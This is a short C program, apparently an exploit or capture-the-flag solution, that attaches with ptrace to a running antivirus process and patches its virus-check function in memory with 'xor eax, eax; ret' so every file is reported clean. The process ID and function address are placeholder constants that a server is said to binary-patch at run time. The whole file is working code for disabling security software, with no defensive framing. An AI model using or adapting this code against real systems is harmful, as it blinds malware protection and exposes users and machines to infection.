#include <assert.h>
#include <stdint.h>
#include <stdio.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

// unusual value to overide with run time pid of the antivirus
const int UNUSUAL_PID_VALUE_FOR_BIN_PATCH = 0x12345678;
// unusual value to memory address of the check_if_value
// to overide with the run time address
const int UNUSUAL_MEMORY_ADDRESS_FOR_BIN_PATCH = 0x56565656;

// global variables for the binary patching of this compiled file
// by the server when getting the run time pid of the antivirus
int pid = UNUSUAL_PID_VALUE_FOR_BIN_PATCH;
int addr = UNUSUAL_MEMORY_ADDRESS_FOR_BIN_PATCH;

int main() {
    // attach to the process
    if(ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1) {
        perror("attach");
        return 1;
    }

    // wait for the process to stop
    int status;
    waitpid(pid, &status, 0);
    // abort if the process exits
    if(WIFEXITED(status)) { return 1; }

    // patching the is_file_virus function to return false
    // on each file

    // 'xor eax, eax' opcode is '\x31\xC0'
    // 'ret' opcode is '\xC3'
    //char payload[] = "\x31\xC0\xC3";
    long payload = 0x00C3C031;
    if(ptrace(PTRACE_POKETEXT, pid, addr, payload) == -1) {
        perror("overriding function check_if_virus with return false");
        return 1;
    }

    // detach from the process
    if(ptrace(PTRACE_DETACH, pid, NULL, NULL) == -1) {
        perror("detach");
        return 1;
    }

    return 0;
}
